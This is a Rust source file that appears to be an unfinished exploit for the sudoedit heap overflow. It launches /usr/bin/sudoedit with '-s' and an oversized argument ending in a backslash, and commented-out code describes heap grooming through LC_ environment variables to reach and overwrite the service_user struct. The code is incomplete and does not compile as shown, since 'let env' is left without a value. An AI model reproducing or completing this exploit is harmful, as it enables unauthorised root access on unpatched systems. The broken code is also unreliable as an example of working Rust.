use std::ffi::CString;
// use std::{collections::HashMap, process::Stdio};
use std::os::raw::c_char;
//, process::Command};

fn main() {
    // // let buf =
    // let mut buf= ['\x00'; 0xf0];

    // for i in &mut buf[0..0xe0] { *i = 'Y' }

    // let args = [
    //     "-s",
    //     buf.iter().collect::<String>().as_str(),
    // ];

    // // Use some LC_ vars for heap Feng-Shui.
    // // This should allocate the target service_user struct in the path of the overflow.
    // // char messages[0xe0] = {"LC_MESSAGES=en_GB.UTF-8@"};
    // // memset(messages + strlen(messages), 'A', 0xb8);

    // // char telephone[0x50] = {"LC_TELEPHONE=C.UTF-8@"};
    // // memset(telephone + strlen(telephone), 'A', 0x28);

    // // char measurement[0x50] = {"LC_MEASUREMENT=C.UTF-8@"};
    // // memset(measurement + strlen(measurement), 'A', 0x28);

    // // This environment variable will be copied onto the heap after the overflowing chunk.
    // // Use it to bridge the gap between the overflow and the target service_user struct.
    // let mut overflow= ['\x00'; 0x500];
    // for i in &mut overflow[0..0x4cf] { *i = 'X' }
    // overflow[0x4cf + 1] = '\\";

    // let overflow_string = overflow.iter().collect::<String>();

    // let envs: HashMap<String, String> = [
    //     (overflow_string.as_str(), ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("XXXXXXX\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("\\", ""),
    //     ("x/x\\", ""),
    //     ("Z", ""),
    //     // messages,
    //     // telephone,
    //     // measurement,
    // ]
    // .iter()
    // .map(|(k, v)| (k.to_string(), v.to_string()))
    // .collect();

    let args = ["sudoedit", "-A", "-s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\"];
    let args: Vec<*mut c_char> = args
        .iter()
        .map(|e| CString::new(*e).expect("building CString").into_raw())
        .collect();
    let args: &[*mut c_char] = args.as_ref();

    // let env
    // let env: HashMap<String, String> = env.iter().map(|e| (e.to_string(), e.to_string())).collect();

    let env
    // let env: Vec<_> = env.iter().map(|e| e.as_ptr()).collect();
    // let env: &[*const u8] = env.as_ref();
    let env: Vec<*mut c_char> = env
        .iter()
        .map(|e| CString::new(*e).expect("building CString").into_raw())
        .collect();
    let env: &[*mut c_char] = env.as_ref();

    unsafe {
        libc::execve(
            "/usr/bin/sudoedit".as_ptr() as *const i8,
            args.as_ptr() as *const *const i8,
            env.as_ptr() as *const *const i8,
        );
    }

    // let env:  HashMap<String, String> =  env.iter()
    // .map(|k| (k.to_string(), "".to_string()))
    // .collect();
    // Command::new("sudoedit")
    //     .env_clear()
    //     .envs(&env)
    //     .args(args.iter())
    //     .spawn()
    //     .expect("running sudoedit");
    // Command::new("ls")
    //     .env_clear()
    //     .envs(&envs)
    //     .spawn()
    //     .expect("running sudoedit");

    // Command::new("printenv")
    // .stdin(Stdio::null())
    // .stdout(Stdio::inherit())
    // .env_clear()
    // .envs(&env)
    // .spawn()
    // .expect("running printenv");
}
